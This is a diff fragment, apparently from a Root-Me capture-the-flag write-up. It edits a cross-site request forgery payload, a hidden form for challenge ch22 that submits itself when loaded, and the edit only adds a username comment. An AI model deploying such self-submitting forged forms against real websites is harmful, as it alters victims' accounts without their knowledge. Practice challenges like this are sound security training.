@@ -16,7 +16,7 @@
 
 ```
 <form name="csrf" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data"> 
-<input type="hidden" name="username" value="YOUR_USERNAME"> 
+<input type="hidden" name="username" value="YOUR_USERNAME"> <!-- Enter your username -->
 <input type="hidden" name="status" value="on"> 
 </form> 
 <script>document.csrf.submit()</script>
